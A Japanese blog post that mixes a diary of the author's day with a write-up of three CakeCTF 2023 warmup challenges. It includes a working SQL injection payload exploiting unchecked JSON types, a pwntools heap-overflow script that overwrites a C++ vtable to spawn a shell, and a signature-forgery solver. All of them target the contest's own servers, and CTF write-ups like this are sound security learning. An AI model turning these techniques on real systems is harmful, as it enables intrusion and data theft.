---
title: "ゲンガーぬいと挑んだCakeCTF 2023【一応writeup】"
emoji: "🎉"
type: "idea" # tech: 技術記事 / idea: アイデア
topics: ["CTF"]
published: true
---

## はじめに

https://2023.cakectf.com/

CakeCTF 2023 にソロチーム ilohas で参加しました。ですが、今回は学園祭があって warmup の 3 問しか解けていません！　というわけで、分量が全然足りないので開催日 11 月 11 日のログを丸々 writeup とします。

## 起床

学園祭が 10 時、移動に 40 分なので、早起きしようと思ったら失敗！　覚醒に時間がかかるタイプなので、9 時だとおそらく間に合わないでしょう。

![](https://storage.googleapis.com/zenn-user-upload/855cbbb66513-20231112.jpg)

というわけで諦めて 11 時まで二度寝しました。

## 昼ごはん

流石にそろそろ出発しないとマズイということで、学校方面のすき家を目指しました。すき家の写真はなかったので、代わりに先日高知に初出店した松屋の写真を載せておきます。松屋で大行列という珍百景が見られます。

https://www.kochinews.co.jp/article/detail/687449

![](https://storage.googleapis.com/zenn-user-upload/3e06fc555aef-20231112.jpg)
![](https://storage.googleapis.com/zenn-user-upload/abee77c76b8f-20231112.jpg)

## 学園祭

権利と身バレ対策で詳細は伏せますが、夜まで適当にブラブラしてました。古本市ではよくわからない戦利品を獲得しました。クメール美術すげえ。

![](https://storage.googleapis.com/zenn-user-upload/b077b34a6ede-20231112.png)
![](https://storage.googleapis.com/zenn-user-upload/296bc0325132-20231112.png)

ついでに研究室に行ったら、所有者行方不明のゲンガーが仲間になりました！

![](https://storage.googleapis.com/zenn-user-upload/6975c8d30208-20231112.jpg)

## 晩ごはん

帰宅すると夜だったので、雑に晩ごはんを作って食べました。材料が無いので、カピカピのねぎを載せた天津飯です。卵便利。

![](https://storage.googleapis.com/zenn-user-upload/dc183ba0cdda-20231112.png)

## ようやく CakeCTF 参戦

ふと予定表を見たら、CakeCTF が入ってました。急いで Register して参戦です。お供はやはりゲンガーです。計算スペースを占領していますが、ゲンガーが代わりに計算してくれます。

![](https://storage.googleapis.com/zenn-user-upload/bb41370cfe4f-20231112.jpg)

## Welcome

Welcome 問題は Discord にあるフラグを入力するというものでした。ケーキ食べたいな。買ってこようかと悩みますが、夜中に食べていいものではないので断念します。

![](https://storage.googleapis.com/zenn-user-upload/52975fa435de-20231112.png)

## Country DB [Web]

Solve 数がやたら多い Web の warmup に挑みます。サービスを見てみたところ、2 文字の国名コードを入力すると国名を表示してくれるようです。

![](https://storage.googleapis.com/zenn-user-upload/a41fef537bb7-20231112.png)

ソースコードが配布されているので、一つずつ読んでいきます。`init_db.py` を見ると、

- データベースは SQLite3
- フラグはテーブル flag に保存されている

ということがわかります。

```python:init.py
import sqlite3
import os

FLAG = os.getenv("FLAG", "FakeCTF{*** REDACTED ***}")

conn = sqlite3.connect("database.db")
conn.execute("""CREATE TABLE country (
  code TEXT NOT NULL,
  name TEXT NOT NULL
);""")
conn.execute("""CREATE TABLE flag (
  flag TEXT NOT NULL
);""")
conn.execute(f"INSERT INTO flag VALUES (?)", (FLAG,))
[snip...]
```

次に `app.py` を見ると、如何にも SQLi をしてくれと言っている関数があります。

```python:app.py
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]
```

ですが、`code` は 2 文字以内でかつ `'` を含んではいけないという条件がありました。

```python:app.py
@app.route('/api/search', methods=['POST'])
def api_search():
    req = flask.request.get_json()
    if 'code' not in req:
        flask.abort(400, "Empty country code")

    code = req['code']
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")

    return {'name': name}
```

ここで Web が苦手な僕は「なら SQLi じゃないのか？」と思いました。ただ、ゲンガーを見てみるとやっぱり SQLi なんじゃないかって気がしてきました。

よくよく `app.py` を見直してみると、JSON の中身の type が検証されていないことに気が付きました。なら、多重構造にして送ってやろうと。というわけで色々とローカルで試したところ、

```
{"code":{"') UNION SELECT flag from flag; --": "a", "B": "b"}}
```

にすると、次のようなクエリになってフラグが出力されることがわかりました。

```
SELECT name FROM country WHERE code=UPPER('{"') UNION SELECT flag from flag; --": 'a', 'B': 'b'}')
```

フラグ GET だぜ！

![](https://storage.googleapis.com/zenn-user-upload/fa7c2be10bb1-20231112.png)
![](https://storage.googleapis.com/zenn-user-upload/2e573a2bb2f1-20231112.png)

## vtable4b [Pwn]

接続してみると、C++の exploit みたいです。

```
$ nc vtable4b.2023.cakectf.com 9000
Today, let's learn how to exploit C++ vtable!
You're going to abuse the following C++ class:

  class Cowsay {
  public:
    Cowsay(char *message) : message_(message) {}
    char*& message() { return message_; }
    virtual void dialogue();

  private:
    char *message_;
  };

An instance of this class is allocated in the heap:

  Cowsay *cowsay = new Cowsay(new char[0x18]());

You can
 1. Call `dialogue` method:
  cowsay->dialogue();

 2. Set `message`:
  std::cin >> cowsay->message();

Last but not least, here is the address of `win` function which you should call to get the flag:
  <win> = 0x562e91c9561a

1. Use cowsay
2. Change message
3. Display heap
>
```

vtable が何かよく知りませんが、とりあえず heap を表示してみます。

```
> 3

  [ address ]    [ heap data ]
               +------------------+
0x562e9240bea0 | 0000000000000000 |
               +------------------+
0x562e9240bea8 | 0000000000000021 |
               +------------------+
0x562e9240beb0 | 0000000000000000 | <-- message (= '')
               +------------------+
0x562e9240beb8 | 0000000000000000 |
               +------------------+
0x562e9240bec0 | 0000000000000000 |
               +------------------+
0x562e9240bec8 | 0000000000000021 |
               +------------------+
0x562e9240bed0 | 0000562e91c98ce8 | ---------------> vtable for Cowsay
               +------------------+                 +------------------+
0x562e9240bed8 | 0000562e9240beb0 |  0x562e91c98ce8 | 0000562e91c956e2 |
               +------------------+                 +------------------+
0x562e9240bee0 | 0000000000000000 |                 --> Cowsay::dialogue
               +------------------+
0x562e9240bee8 | 000000000000f121 |
               +------------------+
```

message に BOF の脆弱性があったので、この表示を頼りに `win` を呼び出してみようと思いました。見たところ、vtable for Cowsay のポインタを `win` のアドレスにしたらよさそうです。

```python:solve.py
from pwn import *

s = remote("vtable4b.2023.cakectf.com", 9000)
s.recvuntil(b"<win> =")
addr_win = int(s.recvline().strip(), 16)
offset = 0x20

s.sendlineafter(b"> ", b"3")
data = s.recvuntil(b"f121")
addrs = []
for d in data.decode().split():
    if d[:2] == "0x":
        addrs.append(d)
vtable_addr = int(addrs[7], 16)

s.sendlineafter(b"> ", b"2")
payload = b"A"*offset
payload += p64(vtable_addr)
payload += p64(addr_win)
s.sendlineafter(b"Message: ", payload)
s.interactive()
```

その状態で heap を表示するとこのようになり上手くいってそうです。

```
  [ address ]    [ heap data ]
               +------------------+
0x55a79c901ea0 | 0000000000000000 |
               +------------------+
0x55a79c901ea8 | 0000000000000021 |
               +------------------+
0x55a79c901eb0 | 4141414141414141 |
               +------------------+
0x55a79c901eb8 | 4141414141414141 |
               +------------------+
0x55a79c901ec0 | 4141414141414141 |
               +------------------+
0x55a79c901ec8 | 4141414141414141 |
               +------------------+
0x55a79c901ed0 | 000055a79c901ed8 | ---------------> vtable for Cowsay (corrupted)
               +------------------+                 +------------------+
0x55a79c901ed8 | 000055a79c24261a |  0x55a79c901ed8 | 000055a79c24261a |
               +------------------+                 +------------------+
0x55a79c901ee0 | 0000000000000000 |                 --> <win> function
               +------------------+
0x55a79c901ee8 | 000000000000f121 |
               +------------------+
```

後は Use してシェル GET です。

```
1. Use cowsay
2. Change message
3. Display heap
> $ 1
[+] You're trying to use vtable at 0x55a79c901ed8
[+] Congratulations! Executing shell...
[snip...]
$ cat /flag-806cb9c9719379667ca5616d9c8210f1.txt
CakeCTF{vt4bl3_1s_ju5t_4n_arr4y_0f_funct1on_p0int3rs}
```

完全なる接待 Pwn プレイですが、我が家のミニブースター達も喜んでいそうです。

![](https://storage.googleapis.com/zenn-user-upload/9d0a2ab08505-20231112.png)

## simple signature [Crypto]

### 問題

$p, g$ : 公開

#### 鍵作成

- $x, y, w$ : 大きい乱数
- $v = wy \bmod{p-1}$
- $u = (wx - 1)v^{-1} \bmod{p-1}$
- $\text{skey} = (x,y,u), \text{vkey} = (w, v)$
- $\text{skey}$ は秘密、$\text{vkey}$ は公開

#### 署名

- $m$ : 平文のハッシュ値（sha512）
- $\text{skey} = (x,y,u)$
- $r$ : 大きい乱数
- $s = g^{xm + ry} \bmod{p}$
- $t = g^{um + r} \bmod{p}$
- $\text{sig} = (s,t)$

#### 検証

- $m$ : 平文のハッシュ値（sha512）
- $\text{sig} = (s,t)$
- $\text{vkey} = (w, v)$
- $g^m \equiv s^w t^{-v} \pmod{p}$ かどうか

#### サーバーの機能

- `magic_word` 以外の署名
- 検証 → `magic_word` で OK だったらフラグを出力

### 解法

まず、$y$ は $v = wy \bmod{p-1}$ から計算できます。

$$
y = vw^{-1} \bmod{p-1}
$$

あとは $x$ が判明するといくらでも署名が作れますが、とてつもない離散対数問題を解く必要があるので無理そうです。というわけで、署名 $(s, t)$ を別の方法で作ることを考えました。

$m$ を `magic_word` のハッシュ値とします。このとき、検証を突破するために満たすべき式は次の通りです。

$$
g^m \equiv s^w t^{-v} \pmod{p}
$$

ですが、この式から直接求めるのは大変そうなので、別の関係式を探すことにしました。$u$ の定義式を変形すると次の式が得られます。

$$
uy \equiv x - w^{-1} \pmod{p-1}
$$

混乱を避けるために $A = w^{-1} \bmod{p-1}$ とおくと、

$$
uy = x - A + (p-1)k
$$

次に、$s, t$ から乱数 $r$ を消去します。

$$
st^{-y} \equiv g^{xm - uym} \pmod{p}
$$

さきほどの $uy$ とフェルマーの小定理から次の関係式が得られます。

$$
g^{Am} \equiv st^{-y} \pmod{p}
$$

一旦整理すると、以下の条件 2 つを満たす $(s, t)$ を求めたいですが、普通に連立方程式として解くのは難しそうです。

$$
\left\{
\begin{array}{l}
g^{Am} \equiv st^{-y} \pmod{p} \\
g^m \equiv s^w t^{-v} \pmod{p}
\end{array}
\right.
$$

と思いましたが、実はこれらの式は同値です（タブンネ）。冷静になって考えてみると、法は $p$, $p-1$ でごちゃごちゃしてますが、フェルマーの小定理を使って計算するとそりゃそうだって。

というわけで、結局は次の不定式を解くだけです。悲しいな、ああ悲しいな、波動拳。

$$
g^{Am} \equiv st^{-y} \pmod{p}
$$

$t$ のほうが明らかにめんどくさいので、$t=2$ と適当に固定します。すると、$s$ は次のように求まります。

$$
s = g^{Am} t^{y} \bmod{p}
$$

```python:solve.py
from pwn import *
from hashlib import sha512


def h(m):
    return int(sha512(m.encode()).hexdigest(), 16)


def verify(m, sig, key):
    w, v = key
    s, t = sig

    return pow(g, m, p) == pow(s, w, p) * pow(t, -v, p) % p


conn = remote("crypto.2023.cakectf.com", 10444)
p = int(conn.recvline().split(b"=")[-1])
g = int(conn.recvline().split(b"=")[-1])

vkey = eval(conn.recvline().split(b"=")[-1])

w, v = vkey
y = pow(w, -1, p-1) * v % (p-1)
A = pow(w, -1, p-1)

magic_word = "cake_does_not_eat_cat"
m = h(magic_word)

t = 2
s = pow(g, A*m, p) * pow(t, y, p) % p

assert verify(h(magic_word), (s, t), vkey)

conn.sendlineafter(b": ", b"V")
conn.sendlineafter(b": ", magic_word.encode())
conn.sendlineafter(b": ", str(s).encode())
conn.sendlineafter(b": ", str(t).encode())

print(conn.recvline().decode())
print(conn.recvline().decode())

```

猫を食べないで(T_T)

```
$ python3 solve.py
[+] Opening connection to crypto.2023.cakectf.com on port 10444: Done
verified

flag = CakeCTF{does_yoshiking_eat_cake_or_cat?}

[*] Closed connection to crypto.2023.cakectf.com port 10444
```

## おわりに

変な時間から参加したので、残念ながらここで終わりです。まともな CTF に参加するのは本当に久々だったので、すごく楽しかったです。勘が明らかに鈍っているのでリハビリが必要そうです。

今回はゲンガーと初参戦しましたが、イケナイ薬物をやっているのでは？と思うぐらいには頭が回転しました。今後の CTF にはぬいが必須になりそうです。ぬい最高！

ケーキはイチゴのショートケーキ派です。チーズケーキも良いかもしれません。
